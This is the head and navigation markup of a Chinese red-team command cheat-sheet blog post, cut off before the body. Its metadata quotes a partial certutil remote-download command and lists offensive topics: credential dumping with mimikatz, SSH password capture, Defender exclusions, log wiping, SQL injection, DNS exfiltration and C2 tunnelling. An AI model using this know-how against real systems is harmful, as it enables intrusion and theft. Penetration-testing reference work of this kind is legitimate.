<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>红队命令速查-洞查文库 | L1uleeの万事屋</title><meta name="keywords" content="资源分享"><meta name="author" content="L1ulee"><meta name="copyright" content="L1ulee"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="红队命令速查-洞查文库"><meta name="application-name" content="红队命令速查-洞查文库"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="红队命令速查-洞查文库"><meta property="og:url" content="https://blog.2sec.io/2024/10/13/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/%E7%BA%A2%E9%98%9F%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5-%E6%B4%9E%E6%9F%A5%E6%96%87%E5%BA%93/index.html"><meta property="og:site_name" content="L1uleeの万事屋"><meta property="og:description" content="红队命令速查-洞查文库Windows 命令速查TCP 出网探测1powershell Test-NetConnection -ComputerName [目标主机名或IP] -Port [端口号]  远程下载文件certutil123certutil.exe -urlcache -split -f"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://www.dmoe.cc/random.php?_r_=81f1a3c5-8dad-760e-8945-1fc4ba6212fa"><meta property="article:author" content="L1ulee"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://www.dmoe.cc/random.php?_r_=81f1a3c5-8dad-760e-8945-1fc4ba6212fa"><meta name="description" content="红队命令速查-洞查文库Windows 命令速查TCP 出网探测1powershell Test-NetConnection -ComputerName [目标主机名或IP] -Port [端口号]  远程下载文件certutil123certutil.exe -urlcache -split -f"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://blog.2sec.io/2024/10/13/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/%E7%BA%A2%E9%98%9F%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5-%E6%B4%9E%E6%9F%A5%E6%96%87%E5%BA%93/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="manifest" href="/manifest.json"/><meta name="msapplication-TileColor" content="var(--anzhiyu-main)"/><link rel="mask-icon" href="/img/siteicon/apple-icon-180.png" color="#5bbad5"/><link rel="apple-touch-icon" sizes="180x180" href="/img/siteicon/apple-icon-180.png"/><link rel="apple-touch-icon-precomposed" sizes="180x180" href="/img/siteicon/apple-icon-180.png"/><link rel="icon" type="image/png" sizes="32x32" href="/img/siteicon/32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/img/siteicon/16.png"/><link rel="bookmark" href="/img/siteicon/apple-icon-180.png"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2048-2732.jpg" media="(device-width: 1024px) and (device-height: 1366px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2732-2048.jpg" media="(device-width: 1024px) and (device-height: 1366px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1668-2388.jpg" media="(device-width: 834px) and (device-height: 1194px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2388-1668.jpg" media="(device-width: 834px) and (device-height: 1194px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1536-2048.jpg" media="(device-width: 768px) and (device-height: 1024px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2048-1536.jpg" media="(device-width: 768px) and (device-height: 1024px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1668-2224.jpg" media="(device-width: 834px) and (device-height: 1112px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2224-1668.jpg" media="(device-width: 834px) and (device-height: 1112px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1620-2160.jpg" media="(device-width: 810px) and (device-height: 1080px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2160-1620.jpg" media="(device-width: 810px) and (device-height: 1080px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1290-2796.jpg" media="(device-width: 430px) and (device-height: 932px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2796-1290.jpg" media="(device-width: 430px) and (device-height: 932px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1179-2556.jpg" media="(device-width: 393px) and (device-height: 852px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2556-1179.jpg" media="(device-width: 393px) and (device-height: 852px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1284-2778.jpg" media="(device-width: 428px) and (device-height: 926px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2778-1284.jpg" media="(device-width: 428px) and (device-height: 926px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1170-2532.jpg" media="(device-width: 390px) and (device-height: 844px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2532-1170.jpg" media="(device-width: 390px) and (device-height: 844px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1125-2436.jpg" media="(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2436-1125.jpg" media="(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1242-2688.jpg" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2688-1242.jpg" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-828-1792.jpg" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1792-828.jpg" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1242-2208.jpg" media="(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2208-1242.jpg" media="(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-750-1334.jpg" media="(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1334-750.jpg" media="(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-640-1136.jpg" media="(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1136-640.jpg" media="(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/@fortawesome/fontawesome-free@6.4.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: undefined,
  postHeadAiDescription: undefined,
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: 'https://comment.2sec.io',
  commentBarrageConfig:undefined,
  music_page_default: "nav_music",
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: undefined,
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"自上次更新以来已经过了","messageNext":"天, 文章内容可能已过时."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: L1ulee","link":"链接: ","source":"来源: L1uleeの万事屋","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'L1uleeの万事屋',
  title: '红队命令速查-洞查文库',
  postAI: '',
  pageFillDescription: '红队命令速查-洞查文库, Windows 命令速查, TCP 出网探测, 远程下载文件, certutil, PowerShell, BitsAdmin, rundll32, IIS 网站查询, 查看 IIS 绑定的网站：, 查看 Site ID 为 1 的物理路径：, IIS 配置文件：, 查看 Windows 系统版本：, 修改文件时间, 进程操作, 查看端口对应 PID：, 查看 PID 对应程序：, 根据 PID 查看程序所在目录：, 执行进程：, 根据名称结束进程：, 搜索进程, Powershell 无窗口执行 EXE, net 命令, netsh 操作防火墙, 查看防火墙配置：, Windows Server 2003 及之前的版本允许指定程序全部连接, Windows Server 2003之后的版本, 允许3389放行, WIndows Defender 加白排除目录：, 文件写入, 注册表：, Restricted Admin Mode, 查看3389端口, 开启远程桌面, 导出 SAM 数据库, 查看盘符剩余空间, 搜索文件：, CS 上线, 设置文件属性, 计划任务, RDP 凭据, Windows 打包目录上传文件, 域渗透命令, Linux 命令速查, 本次不记录命令, 常用日志清理, Web 日志清理, 设置终端代理, 查看用户登录记录, root 权限创建管理员用户, cURLx2Fwget 下载文件, curlx2Fwget 发送文件, 文件时间修改, 查看 DNS 服务器, 停止防火墙, 搜索敏感信息, echo 写文件, 写入 ssh 公钥：, 压缩打包文件, 分割上传, 十六进制获取文件, pam_exec 抓 SSH 密码, Debianx2FUbuntu Docker 安装, JDK 安装, 数据库命令速查, mysql, mysql 查连接 IP, mysql 查最大数量表, 查询 user 字段在哪个库哪个表, 统计访问过的表次数, 查看写入权限, 不登录执行 sql, 基础命令, sql server, xp_cmdshell, MSSQL 默认数据库, MSSQL 注释, MSSQL 用户, MSSQL 版本查看, MSSQL 主机名, MSSQL 数据库名, MSSQL 数据库凭证, MSSQL 列出数据库, MSSQL 列出列, MSSQL 列出表, MSSQL 联合注入, MSSQL 报错注入, MSSQL 盲注, MSSQL 时间注入, MSSQL 堆栈查询, MSSQL 读取文件, MSSQL 命令执行, MSSQL 外带数据, MSSQL DNS 外带数据, MSSQL UNC 路径, MSSQL 提升权限为 DB 管理员, MSSQL 受信任链接, 列出权限, 列出当前用户在服务器上的有效权限。, 列出当前用户在数据库上的有效权限。, 列出当前用户在视图上的有效权限。, 检查当前用户是否属于指定的服务器角色。, MSSQL OPSEC, References, oracle, oracle查最大数量表, 查询包含 user 字段在哪个库哪个表, Oracle SQL 默认数据库, Oracle SQL 注释, Oracle SQL 版本, Oracle SQL 主机名, Oracle SQL 数据库名称, Oracle SQL 数据库凭证, Oracle SQL 列出数据库, Oracle SQL 列出列, Oracle SQL 列出表, Oracle SQL 报错注入, Oracle SQL 盲注, Oracle SQL 时间注入, Oracle SQL 命令执行, Oracle Java Execution, Oracle Java Class, References, postgresql, PostgreSQL 命令执行, CVE-2019–9193, 使用 libc.so.6, PostgreSQL 注释, PostgreSQL 链注入点符号, PostgreSQL 版本, PostgreSQL 当前用户, PostgreSQL 用户列表, PostgreSQL 密码哈希列表, 查询数据库管理员账户列表, PostgreSQL 权限列表, 查询当前用户是否为超级用户, PostgreSQL 数据库名称, PostgreSQL 数据库列表, PostgreSQL 表格列表, PostgreSQL 列表列, PostgreSQL 报错注入, PostgreSQL XML 帮助器, PostgreSQL 盲注, PostgreSQL 时间盲注, PostgreSQL 堆叠查询, PostgreSQL 文件读取, PostgreSQL 文件写入, 绕过过滤器, 工具使用命令速查, mimikatz, 获取登录凭证信息, lsass.exe 导出凭据, mimikatz PTH 传递 cmd, mimikatz PTH 传递 mstsc, SAM 数据库导出凭据, bat 脚本获取凭据, 导出域内所有用户hash, proxy tools, iox, proxy, fwd, fuso, socks, readme, pingtunnel+frp 搭 icmp 隧道, 被控机, 客户端frp配置, VPS, FRP, 代理工具列表, 后渗透工具列表, f8x, Supershell, Viper, Sliver C2, Impacket红队命令速查洞查文库命令速查出网探测目标主机名或端口号远程下载文件从下载并保存到网站查询查看绑定的网站查看为的物理路径配置文件查看系统版本修改文件时间进程操作查看端口对应查看对应程序根据查看程序所在目录执行进程根据名称结束进程搜索进程无窗口执行命令查看用户列表查看用户列表查看用户组列表查看管理组列表添加用户并设置密码将用户加入管理组将用户加入桌面组激活用户更改用户的密码将用户加入管理组将用户加入桌面组查看本地密码策略查看当前会话建立会话操作防火墙查看防火墙配置及之前的版本允许指定程序全部连接之后的版本允许放行加白排除目录文件写入写入覆盖追加有换行写入不换行追加不换行追加规避空格将编码的文件解码写入到将十六进制文件解码写入到注册表对应命令行开启命令如下查看是否已开启存在就是开启查看端口端口查询开启远程桌面或者导出数据库复制使用进行复制查看盘符剩余空间大小为字节磁盘查看盘查看盘搜索文件搜索盘下名为的文件搜素盘下后缀为内容且包含不区分大小写上线设置文件属性给文件设置系统文件属性存档文件属性隐藏文件属性只读文件属性计划任务创建一个名为开机时执行的计划任务需要管理员权限修改计划任务需要管理员权限更改任务无法通过参数更改计划频率凭据列出所有凭证用户名打包目录上传文件域渗透命令查看当前用户权限可知域名和其他信息查询域用户添加域用户添加域管理员添加企业管理员查询域管理员用户查询域企业管理组查询域本地管理组查询域控制器和时间查询域名称查询域内计算机查看当前域内计算机列表查看域控机器名查看域密码策略查看域信任查看某个域的域信任通过记录查找域控制器命令速查本次不记录命令常用日志清理记录所有登录失败信息使用命令查看记录系统中所有用户最后一次登录时间的日志使用命令查看记录所有用户的登录注销信息使用命令查看记录当前已经登录的用户信息使用等命令查看记录与安全相关的日志信息记录系统启动后的信息和错误日志日志清理直接替换日志地址清除部分相关日志使用来把相关信息删除把修改过的日志覆盖到原日志文件设置终端代理查看用户登录记录权限创建管理员用户下载文件发送文件服务器正在监听连接来自读取请求头提取文件名可以根据实际需求修改提取方式默认文件名保存文件文件已保存文件时间修改修改时间为查看服务器停止防火墙搜索敏感信息写文件直接写入写入追加在线编码写入公钥使用在末尾处插入如需换行可添加参考压缩打包文件将两个目录打包至目录下命名为可使用排除如分割上传分割为个文件以大小分割合并合并十六进制获取文件将文件转换为十六进制本地还原抓密码需要关闭关闭开启修改第一行添加安装安装以及安装一些必要的软件包加入的公钥和源国内机器可以用清华的国内源然后更新系统后即可安装和插件安装安装运行手动数据库命令速查查连接查最大数量表查询字段在哪个库哪个表统计访问过的表次数库名表名访问次数查看写入权限可写入不可写入表示禁止如果值有文件夹目录则表示只允许该目录下文件测试子目录也不行如果为空则表示不限制目录不登录执行基础命令显示版本显示字符集显示数据库显示表名显示字段显示计算机名系统版本路径数据库路径显示密码导入文件导出文件开启外连安装路径更新数据库更新变成更改密码查询表获取数据库所有表获取列前行获取表行数相关工具之前版本默认开启判断是否存在存储过程返回表示存在否则表示不存在删除恢复之后的版本中默认关闭需要手动开启开启需要权限允许修改高级参数配置生效开启配置生效检查是否开启执行系统命令获取默认数据库描述在中不可用在所有版本中可用在所有版本中可用在所有版本中可用在所有版本中可用从及更高版本开始可用注释描述注释注释用户版本查看主机名数据库名数据库凭证列出数据库列出列列出表联合注入报错注入盲注时间注入堆栈查询读取文件命令执行重新激活在中默认禁用与实例交互执行脚本由与使用执行命令的用户不同的用户执行外带数据外带数据路径提升权限为管理员受信任链接列出权限列出当前用户在服务器上的有效权限列出当前用户在数据库上的有效权限列出当前用户在视图上的有效权限检查当前用户是否属于指定的服务器角色在查询中使用以隐藏日志如注大部分内容翻译至渗透测试相关工具查最大数量表查询包含字段在哪个库哪个表默认数据库适用于所有版本适用于所有版本注释版本主机名数据库名称数据库凭证语句描述适用于所有版本列出数据库列出列列出表报错注入盲注时间注入命令执行注大部分内容翻译至命令执行使用注释链注入点符号用于终止命令在语句中唯一可使用的位置是在字符串常量或引用标识符中或语句使用示例版本当前用户用户列表密码哈希列表查询数据库管理员账户列表权限列表查询当前用户是否为超级用户数据库名称数据库列表表格列表列表列报错注入帮助器返回所有结果作为单个行将当前数据库转储为将当前数据库转储为架构盲注时间盲注堆叠查询文件读取文件写入绕过过滤器引号使用使用符号适用于及以上版本注大部分内容翻译至工具使用命令速查官方获取登录凭证信息导出凭据传递传递数据库导出凭据脚本获取凭据导出域内所有用户下载地址在本地启动服务加密转发代理监听将端口监听到的流量转发至端口在目标主机执行启动代理服务并发送至端口然后本地代理本地端口转发至执行目标机器执行随后连接即可访问内网被控机端口转发转发到的地址转发到的端口如转发流量到内网可选的开启转发可选的认证密码默认不进行密码认证可选的认证账号默认账号可选的开启代理未指定的情况下不会转发如开启转发与密码认证此时已开启转发连接密码为账号为指定穿透成功时访问的端口可选的默认随机分配如访问外网端口转发到内网桥接模式注意目前不能转发监听地址默认监听端口默认不启用桥接如开始桥接模式并监听在端口本机地址为开启桥接建立连接级联第一级第二级最终将连接信息通知到或其他建立连接或断开连接时的钩子如使用脚本将连接信息通知到指定客户端与服务端通信的端口可选的客户端与服务端通信端口默认随机搭隧道下载被控机监听本地的端口主机主机服务端口客户端配置本地代理的端口加上密码即可使用隧道参考文章将及放到具有公网的机器上将及放到处于内网环境的机器上客户端服务端代理工具列表全平台代理工具支持多种协议专注于内网穿透的高性能的反向代理应用轻量级高性能功能强大的内网穿透代理服务器端口转发内网代理工具面向渗透测试人员的多级代理工具编写的安全稳定高性能的内网穿透工具一款高性能的支持绑定反向代理的工具基于编写的跨平台稳定隐秘的多级代理内网穿透工具浏览器的代理插件改进的版本是一款利用协议传输数据的工具是一个隧道工具基于加密的隧道工具内网渗透代理端口转发工具一款利用虚拟网卡在网络层实现的代理工具用于开启代理服务的工具跨平台开源的点对点穿透工具一款基于协议传输流量的工具一个简单的正反向代理内网穿透端口转发全平台的加密隧道端口转发工具命令行代理神器一个多功能的端口转发端口复用工具是把流量伪装成流量进行转发的工具一款快速稳定的隧道工具一款使用进行流量转发的出网工具通过代理建立连接的工具是一个将局域网个人电脑服务器代理到公网的内网穿透工具是一款为渗透测试人员设计的使用开发的多级代理工具一款轻量级功能强大高性能的多种代理工具一个基于腾讯云函数服务的免费代理池是边缘或服务网格的云原生代理一款可以在不出网的环境下进行反向代理及上线的工具后渗透工具列表一款红蓝队环境自动化部署工具支持多种场景渗透开发代理环境服务可选项等项目地址中文文档远控平台基于反向隧道获取完全交互式项目地址互联网攻击面管理红队模拟平台项目地址安装使用手册是一个开源的跨平台红队框架项目地址红队工具研究篇内网渗透工具包项目地址',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-11-26 01:21:09',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="L1uleeの万事屋" type="application/atom+xml">
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://bu.dusays.com/2023/10/18/652ec6e6bfd3a.gif"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">L1uleeの万事屋</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/?id=7342230281&amp;server=netease"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a 